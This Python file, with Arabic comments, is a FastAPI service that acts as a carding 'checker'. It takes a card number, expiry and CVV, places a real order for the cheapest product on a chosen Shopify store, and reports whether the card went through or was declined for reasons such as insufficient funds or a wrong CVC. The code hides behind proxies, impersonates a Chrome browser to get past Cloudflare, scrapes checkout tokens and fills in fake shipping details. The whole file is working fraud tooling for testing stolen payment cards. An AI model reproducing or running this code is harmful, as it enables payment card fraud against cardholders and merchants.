from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import random
import time

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate):
    """تشفير الكلمات لحماية البروكسي من الحذف داخل البوت"""
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx")
    clean_msg = clean_msg.replace("Connection", "Conn").replace("connection", "conn")
    clean_msg = clean_msg.replace("Timeout", "T-out").replace("timeout", "t-out")
    clean_price = str(price).replace('$', '').strip()
    return {"Response": clean_msg, "Price": clean_price, "Gate": gate}

def extract_hybrid_token(html_text):
    """الرادار المدمج: يسحب التوكن من النظام القديم والحديث"""
    from html import unescape
    
    # 1. من نظام Extensibility الحديث (session_token)
    meta_pattern = r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"'
    meta_match = re.search(meta_pattern, html_text)
    if meta_match:
        return unescape(meta_match.group(1)).strip('"')
        
    # 2. من النظام الكلاسيكي (authenticity_token)
    patterns = [
        r'name="authenticity_token"\s*value="([^"]+)"',
        r'value="([^"]+)"\s*name="authenticity_token"',
        r'<meta\s+name="csrf-token"\s*content="([^"]+)"',
        r'"authenticity_token"\s*:\s*"([^"]+)"',
        r'\\u0026authenticity_token=([^&"\'\\]+)'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: 
            return match.group(1)
    return None

def extract_gateway(html_text):
    patterns = [
        r'name="checkout\[payment_gateway\]"\s*type="radio"\s*value="(\d+)"',
        r'value="(\d+)"\s*name="checkout\[payment_gateway\]"',
        r'"payment_instruments":\[{"id":(\d+)'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: return match.group(1)
    return "1"

async def get_robust_product(session, store_url):
    """جلب المنتجات بطريقة متخفية ومضادة للكلاودفلير"""
    endpoints = [
        f"{store_url}/products.json?limit=50",
        f"{store_url}/collections/all/products.json?limit=50"
    ]
    
    headers = {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    for ep in endpoints:
        try:
            res = await session.get(ep, headers=headers)
            if res.status_code == 200:
                data = res.json()
                products = data if isinstance(data, list) else data.get('products', [])
                
                cheapest_variant = None
                lowest_price = float('inf')
                
                for product in products:
                    for variant in product.get('variants', []):
                        if variant.get('available', True):
                            try:
                                price_val = float(variant.get('price', 0.0))
                                if price_val > 10000: price_val = price_val / 100.0 # معالجة السنتات
                                
                                if 0.0 < price_val < lowest_price:
                                    lowest_price = price_val
                                    cheapest_variant = variant.get('id')
                            except: pass
                
                if cheapest_variant:
                    return str(cheapest_variant), str(round(lowest_price, 2))
        except:
            continue
            
    return None, "-"

async def check_shopify_hybrid(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify Hybrid API")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        # تم التصحيح هنا: العودة إلى chrome110 المدعوم والمستقر لتجنب الانهيار
        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60) as session:
            
            # 1. سحب المنتج المتخفي
            variant_id, price = await get_robust_product(session, store_url)
            if not variant_id:
                chk = await session.get(store_url)
                if chk.status_code in [403, 429]:
                    return safe_response("Cloudflare blocked Prx (Product Fetch)", "-", "Shopify Hybrid API")
                return safe_response("No available products found", "-", "Shopify Hybrid API")

            # 2. الإضافة للسلة بهيدرز شرعية
            add_url = f"{store_url}/cart/add.js"
            add_data = {"id": str(variant_id), "quantity": "1"}
            add_headers = {"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"}
            res2 = await session.post(add_url, data=add_data, headers=add_headers)
            if res2.status_code != 200: 
                return safe_response("Cart Add Failed (Anti-Bot Active)", price, "Shopify Hybrid API")

            # 3. الدخول لصفحة الدفع
            checkout_url = f"{store_url}/checkout"
            res3 = await session.get(checkout_url, allow_redirects=True)
            checkout_html = res3.text
            checkout_final_url = str(res3.url)
            
            # 4. الرادار الهجين لسحب التوكن
            auth_token = extract_hybrid_token(checkout_html)

            if not auth_token:
                title_match = re.search(r'<title>([^<]+)</title>', checkout_html)
                page_title = title_match.group(1).strip() if title_match else "Unknown Page"
                if "Just a moment" in page_title or "Cloudflare" in page_title:
                    return safe_response("Cloudflare Challenge Blocked Request", price, "Shopify Hybrid API")
                return safe_response(f"Token Not Found (Page: {page_title[:15]})", price, "Shopify Hybrid API")

            # 5. تعبئة العنوان لتفعيل بوابة الدفع
            email = f"johndoe{random.randint(1000,9999)}@gmail.com"
            address_payload = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "contact_information",
                "step": "shipping_method",
                "checkout[email]": email,
                "checkout[shipping_address][first_name]": "John",
                "checkout[shipping_address][last_name]": "Doe",
                "checkout[shipping_address][address1]": "123 Main Street",
                "checkout[shipping_address][city]": "New York",
                "checkout[shipping_address][country]": "United States",
                "checkout[shipping_address][province]": "New York",
                "checkout[shipping_address][zip]": "10001",
                "checkout[shipping_address][phone]": "(212) 555-1234",
                "button": ""
            }
            res_addr = await session.post(checkout_final_url, data=address_payload, allow_redirects=True)
            html_addr = res_addr.text
            checkout_final_url = str(res_addr.url)

            auth_token2 = extract_hybrid_token(html_addr) or auth_token

            # 6. تخطي الشحن
            shipping_payload = {
                "_method": "patch",
                "authenticity_token": auth_token2,
                "previous_step": "shipping_method",
                "step": "payment_method",
                "button": ""
            }
            res_ship = await session.post(checkout_final_url, data=shipping_payload, allow_redirects=True)
            html_ship = res_ship.text
            checkout_final_url = str(res_ship.url)

            auth_token_final = extract_hybrid_token(html_ship) or auth_token2
            gateway_id = extract_gateway(html_ship)

            # 7. تشفير البطاقة داخل سيرفر شوبي فاي الرسمي
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
            token_headers = {"Accept": "application/json", "Content-Type": "application/json"}
            
            res_token = await session.post(token_url, json=token_payload, headers=token_headers)
            if res_token.status_code != 200: 
                return safe_response("Failed to tokenize card (IP Banned)", price, "Shopify Hybrid API")
            
            payment_token = res_token.json().get("id")

            # 8. إرسال الدفع
            payment_payload = {
                "_method": "patch",
                "authenticity_token": auth_token_final,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": gateway_id, 
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "complete": "1"
            }
            
            res_pay = await session.post(checkout_final_url, data=payment_payload, allow_redirects=True)
            result_html = res_pay.text.lower()
            
            # 9. قراءة الرد النهائي
            if "thank you" in result_html or "order completed" in result_html or res_pay.url.endswith('/thank_you'):
                return safe_response("Order completed 💎", price, "Shopify Hybrid API")
            elif "insufficient funds" in result_html or "not enough funds" in result_html: 
                return safe_response("Insufficient Funds", price, "Shopify Hybrid API")
            elif "incorrect_cvc" in result_html or "security code was not matched" in result_html: 
                return safe_response("Incorrect CVC", price, "Shopify Hybrid API")
            elif "zip code does not match" in result_html or "avs" in result_html: 
                return safe_response("ZIP Code Mismatch", price, "Shopify Hybrid API")
            elif "do not honor" in result_html or "generic_decline" in result_html: 
                return safe_response("Do Not Honor", price, "Shopify Hybrid API")
            else:
                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                if error_match: return safe_response(error_match.group(1).strip(), price, "Shopify Hybrid API")
                
                if "payment" in result_html and "error" in result_html:
                     return safe_response("Generic Payment Error", price, "Shopify Hybrid API")
                     
                return safe_response("Declined / Custom Gate Error", price, "Shopify Hybrid API")

    except Exception as e:
        err_str = str(e).lower()
        return safe_response(f"Sys_Err: {err_str[:40]}", "-", "Shopify Hybrid API")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify_hybrid(cc, url, proxy)
    return JSONResponse(content=result)
